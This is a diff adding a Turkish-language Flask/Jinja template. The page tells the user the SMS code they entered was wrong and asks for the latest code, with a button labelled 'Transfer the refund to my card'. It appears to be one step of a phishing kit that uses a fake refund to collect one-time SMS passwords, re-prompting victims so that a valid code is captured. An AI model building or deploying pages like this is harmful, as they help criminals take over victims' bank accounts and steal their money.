@@ -1,0 +1,23 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="richText">
+    <strong>Girmiş olduğunuz sms şifresi yanlıştır.</strong> Telefonunuza gönderilen son sms şifresini giriniz.
+</div>
+<form method="post" id="smsFailForm" autocomplete="off">
+    <fieldset>
+        <div class="formRow required">
+            <label for="smsFailField" class="rowLabel">SMS Şifreniz</label>
+            <div class="fieldGroup">
+                <input name="sms2" id="smsFailField" type="tel" maxlength="10" class="text" required>
+            </div>
+        </div>
+    </fieldset>
+    <div class="loader is-hidden">
+        <img src="{{ url_for('static', filename='img/form-progress.svg') }}" alt="...">İşleminiz devam ediyor. Lütfen bekleyiniz...
+    </div>
+    <div class="formSubmitRow">
+        <button type="submit" class="submitButton">İadeyi Kartıma Aktar</button>
+        <button type="button" class="backButton" onclick="window.history.back()">İptal Et</button>
+    </div>
+</form>
+{% endblock %}
